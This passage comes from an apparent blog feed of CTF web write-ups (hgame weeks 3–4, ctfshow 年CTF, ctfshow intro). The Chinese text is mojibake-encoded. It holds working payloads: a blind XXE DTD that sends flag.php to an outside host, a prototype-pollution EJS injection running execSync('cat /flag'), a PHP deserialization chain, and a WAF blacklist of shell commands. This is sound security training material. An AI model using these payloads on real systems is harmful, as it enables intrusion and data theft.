function_">waf</span>(<span class="params">ip</span>):</span><br><span class="line">    blacklist = [<span class="string">&quot;;&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;cd&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot;tac&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;\+&quot;</span>, <span class="string">&quot;echo&quot;</span>, <span class="string">&quot;flag&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> blacklist:</span><br><span class="line">        match = re.search(black, ip, re.M | re.I)</span><br><span class="line">        <span class="built_in">print</span>(match)</span><br><span class="line">        <span class="keyword">if</span> match:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Gopher-Shop"><a href="#Gopher-Shop" class="headerlink" title="Gopher Shop"></a>Gopher Shop</h3><p>æ•´æ•°æº¢å‡ºï¼Œå¯ä»¥ä½¿ç”¨<code>2&lt;&lt;45</code></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/v1/user/buyProduct?product=Flag&amp;number=70368744177664</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>week-3.hgame.lwsec.cn:32018</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://week-3.hgame.lwsec.cn:32018/shop</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>_ga=GA1.1.41308100.1673534855; _ga_P1E9Z5LRRK=GS1.1.1673534854.1.1.1673536392.0.0.0; SESSION=MTY3NDY2NTg3MnxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBY0FCV0ZrYldsdXxekOjqNPPWh-9h9e_otzhkRGXPnOpeotEWZA1kkvwT2w==; session=MTY3NDY2OTc2N3xEdi1CQkFFQ180SUFBUkFCRUFBQUpfLUNBQUVHYzNSeWFXNW5EQW9BQ0hWelpYSnVZVzFsQm5OMGNtbHVad3dIQUFWaFpHMXBiZz09fGWqb-tXfvhtArGTKVpLiHKHSHtXFhQWeBmT8yg6aooa</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è´­ä¹°æˆåŠŸåç›´æ¥<code>Check Flag</code>å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;GopherShop_M@gic_1nt_0verflow&#125;</span><br></pre></td></tr></table></figure><h2 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h2><h3 id="Tell-Me"><a href="#Tell-Me" class="headerlink" title="Tell Me"></a>Tell Me</h3><p>è®¿é—®<code>www.zip</code>è·å–æºç ï¼Œçœ‹ä¸‹<code>send.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    </span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$xmldata</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$xmldata</span>))&#123;</span><br><span class="line">        <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmldata</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="string">&quot;loading xml data error&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$data</span>-&gt;name) || !<span class="keyword">isset</span>(<span class="variable">$data</span>-&gt;email) || !<span class="keyword">isset</span>(<span class="variable">$data</span>-&gt;content))&#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="string">&quot;name,email,content cannot be empty&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$data</span>-&gt;name &amp;&amp; <span class="variable">$data</span>-&gt;email &amp;&amp; <span class="variable">$data</span>-&gt;content)&#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="string">&quot;Success! I will see it later&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="string">&quot;Parse xml data error&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Request Method Not Allowed&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é¦–è¡Œ<code>libxml_disable_entity_loader(false);</code>å¯ä»¥çœ‹å‡ºæœ‰<code>xxe</code>æ¼æ´ï¼Œå…ˆéƒ¨ç½²ä¸‹è‡ªå·±çš„<code>exp.dtd</code>(è®°å¾—å¯¹<code>%</code>ç¼–ç ä¸€ä¸‹)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=flag.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % print &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://xxx.xxx.xx.xx:xxxxxxx/?c=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰“</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://xxx.xxx.xx.xx/exp.dtd&quot;&gt;</span><br><span class="line">%dtd;%print;%send;]&gt;</span><br></pre></td></tr></table></figure><p>å‘ç°<code>flag</code></p><p><img src="https://cdnjson.com/images/2023/02/05/tellme.png" alt="tellme.png"></p><p>è§£ç ä¸€ä¸‹å³å¯</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$flag1</span> = <span class="string">&quot;hgame&#123;Be_Aware_0f_XXeBl1nd1njecti0n&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Shared-Diary"><a href="#Shared-Diary" class="headerlink" title="Shared Diary"></a>Shared Diary</h3><p>ä¼ <code>json</code>ç»™<code>login</code>è·å–<code>session</code></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;client&quot;</span><span class="punctuation">:</span><span class="keyword">true</span><span class="punctuation">,</span><span class="attr">&quot;escapeFunction&quot;</span><span class="punctuation">:</span><span class="string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;);&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;compileDebug&quot;</span><span class="punctuation">:</span><span class="keyword">true</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>ç„¶åç”¨å¾—åˆ°çš„<code>session</code>å»<code>POST</code>è¯·æ±‚<code>\</code>å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session=s%3AHHwyaFtboARnsQI0PO6-9LJ9nrxBLQ-S.%2FdYHGGiw8Q3FhBzWW0ZZ7Y%2FhVCq%2BuMbczIqvEePmWtY;</span><br></pre></td></tr></table></figure><p>æœ€åå¾—åˆ°<code>flag</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;N0tice_prototype_pollution&amp;&amp;EJS_server_template_injection&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> hgame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-å¹´ctf-webé¢˜è§£</title>
      <link href="/2023/01/28/ctfshow-nianctf-web/"/>
      <url>/2023/01/28/ctfshow-nianctf-web/</url>
      
        <content type="html"><![CDATA[<h2 id="ctfshow-å¹´CTF-webé¢˜è§£"><a href="#ctfshow-å¹´CTF-webé¢˜è§£" class="headerlink" title="ctfshow å¹´CTF webé¢˜è§£"></a>ctfshow å¹´CTF webé¢˜è§£</h2><h3 id="é™¤å¤•"><a href="#é™¤å¤•" class="headerlink" title="é™¤å¤•"></a>é™¤å¤•</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-01-18 11:36:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-01-19 10:18:44</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$year</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;year&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$year</span>==<span class="number">2022</span> &amp;&amp; <span class="variable">$year</span>+<span class="number">1</span>!==<span class="number">2023</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¼±ç±»å‹æ¯”è¾ƒ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?year=2022.e</span><br></pre></td></tr></table></figure><h3 id="åˆä¸‰"><a href="#åˆä¸‰" class="headerlink" title="åˆä¸‰"></a>åˆä¸‰</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-01-19 10:31:36</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-01-19 13:11:08</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$__</span>,<span class="variable">$___</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$__</span>==<span class="variable">$___</span>?<span class="variable">$___</span>:<span class="variable">$__</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$$__</span>(<span class="variable">$_</span>(<span class="variable">$_GET</span>&#123;</span><br><span class="line">    <span class="variable">$___</span></span><br><span class="line">&#125;[<span class="variable">$____</span>]&#123;</span><br><span class="line">    <span class="variable">$_____</span></span><br><span class="line">&#125;(),<span class="variable">$flag</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ„é€ å‡º<code>var_dump($_(phpinfo(),$flag))</code>å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?__=a&amp;a=var_dump&amp;___=b&amp;c[2]=phpinfo&amp;b[1][2]=phpinfo&amp;____=1&amp;_____=2</span><br></pre></td></tr></table></figure><h3 id="åˆå…­"><a href="#åˆå…­" class="headerlink" title="åˆå…­"></a>åˆå…­</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-01-18 08:46:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-01-18 11:19:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">happy2year</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$argv</span></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;key, <span class="keyword">array</span>(<span class="variable">$method</span>,<span class="variable">$argv</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getSecret</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$key</span>=<span class="variable">$key</span>?<span class="variable">$key</span>:<span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">createSecret</span>(<span class="variable">$key</span>);    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createSecret</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$this</span>-&gt;key.<span class="variable">$this</span>-&gt;secret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$arg</span>=<span class="string">&quot;get&quot;</span>.<span class="variable">$arg</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$arg</span> = <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg</span>,<span class="variable">$argv</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$arg</span>.<span class="variable">$argv</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$secret</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">secret</span>().<span class="variable">$this</span>-&gt;secret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$data</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line"><span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$obj</span>)&#123;</span><br><span class="line">    <span class="variable">$secret</span> = <span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">getSecret</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;ä½ æäº¤çš„keyæ˜¯&quot;</span>.<span class="variable">$key</span>.<span class="string">&quot;\nç”Ÿæˆçš„secretæ˜¯&quot;</span>.<span class="variable">$secret</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ä¸¤ä¸ªå˜é‡ç”¨<code>.</code>è¿æ¥æ—¶ï¼Œä¹Ÿä¼šè§¦å‘<code>toString</code>æ–¹æ³•ï¼Œæ•…åˆ©ç”¨é“¾å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getSecret -&gt; createSecret -&gt; __toString(æœ‰ä¸ªsecret()) -&gt; __call(ç¬¬ä¸€ä¸ªå‚æ•°å½“ä½œå‡½æ•°è°ƒç”¨) -&gt; __invoke($secretå¯ä»¥ä½¿å¾—è®¿é—®ç±»ä¸­ä¸å­˜åœ¨å˜é‡) -&gt; __get</span><br></pre></td></tr></table></figure><p><code>exp</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">happy2year</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$secret</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span> = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">happy2year</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;key = <span class="keyword">new</span> <span class="title function_ invoke__">happy2year</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;key-&gt;key = <span class="keyword">new</span> <span class="title function_ invoke__">happy2year</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)).PHP_EOL;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨è¯¥<code>payload</code>è®¿é—®é¡µé¢å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POSTï¼š</span><br><span class="line">data=O%3A10%3A%22happy2year%22%3A2%3A%7Bs%3A6%3A%22secret%22%3Bs%3A3%3A%22123%22%3Bs%3A3%3A%22key%22%3BO%3A10%3A%22happy2year%22%3A2%3A%7Bs%3A6%3A%22secret%22%3Bs%3A3%3A%22123%22%3Bs%3A3%3A%22key%22%3BO%3A10%3A%22happy2year%22%3A2%3A%7Bs%3A6%3A%22secret%22%3Bs%3A3%3A%22123%22%3Bs%3A3%3A%22key%22%3Bs%3A3%3A%22abc%22%3B%7D%7D%7D&amp;key=def</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> ctfshow </tag>
            
            <tag> å¹´CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow Webå…¥é—¨ åˆ·é¢˜è®°å½• 1</title>
      <link href="/2022/12/22/ctfshow-web1/"/>
      <url>/2022/12/22/ctfshow-web1/</url>
      
        <content type="html"><![CDATA[<h1 id="ctfshow-Webå…¥é—¨åˆ·é¢˜è®°å½•1"><a href="#ctfshow-Webå…¥é—¨åˆ·é¢˜è®°å½•1" class="headerlink" title="ctfshow-Webå…¥é—¨åˆ·é¢˜è®°å½•1"></a>ctfshow-Webå…¥é—¨åˆ·é¢˜è®°å½•1</h1><blockquote><p>å‚è€ƒï¼š</p><p><a href="https://www.wlhhlc.top/posts/14827/">ctfshow-Web1000é¢˜ç³»åˆ—ä¿®ç‚¼(ä¸€)</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/109197158">CTFSHOW PHPç‰¹æ€§ç¯‡ ï¼ˆä¸‹ç¯‡132-150ï¼‰</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">æ— å­—æ¯æ•°å­—ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼æ€»ç»“ï¼ˆå«ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶ã€å¼‚æˆ–ã€æˆ–ã€å–åã€è‡ªå¢è„šæœ¬ï¼‰</a></p></blockquote><h2 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>æŸ¥çœ‹æºç </p><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p><code>view-source:</code></p><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>æŠ“åŒ…ï¼Œåœ¨å“åº”åŒ…å‘ç°<code>Flag: ctfshow&#123;b5a5badc-46c5-4c2c-ad28-174f21781454&#125;</code></p><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/robots.txt</span><br><span class="line">/flagishere.txt</span><br></pre></td></tr></table></figure><h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p><code>/index.php</code></p><h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p><code>/www.zip</code></p><h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p><code>/.git/</code></p><h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><p><code>/.svn/</code></p><h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><p><code>/index.php.swp</code></p><h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><p>å¯¹<code>Cookie</code>ä¸­<code>flag</code>å­—æ®µè¿›è¡Œ<code>URL</code>è§£ç å³å¯</p><h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><p>åœ¨<a href="http://dbcha.com/">åŸŸåè§£ææŸ¥è¯¢</a>é€‰å®š<code>txt</code>åˆ†ç±»å¯¹<code>flag.ctfshow.com</code>è¿›è¡ŒæŸ¥è¯¢å³å¯</p><h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><p>é¡µé¢æœ€åº•éƒ¨å‘ç°<code>Help Line Number : 372619038</code></p><p>è®¿é—®<code>\admin</code>å¹¶ä½¿ç”¨<code>admin/372619038</code>å³å¯ç™»å½•</p><h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><p>ç‚¹å‡»é¡µé¢åº•éƒ¨çš„<code>INFORMATION</code>åˆ†æ ä¸­æœ€ä¸‹é¢çš„<code>document</code></p><h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><p>æŸ¥çœ‹æºç æœç´¢<code>editor</code></p><p>è®¿é—®<code>/editor/</code>ï¼Œé€‰æ‹©<code>å›¾ç‰‡</code>ä¸­çš„<code>ç½‘ç»œå›¾ç‰‡</code>ä¸­çš„<code>å›¾ç‰‡ç©ºé—´</code></p><p>å‘ç°<code>/editor/attached/image/var/www/html/nothinghere/fl000g.txt</code></p><p>è®¿é—®<code>/nothinghere/fl000g.txt</code>å³å¯</p><h3 id="web15"><a href="#web15" class="headerlink" 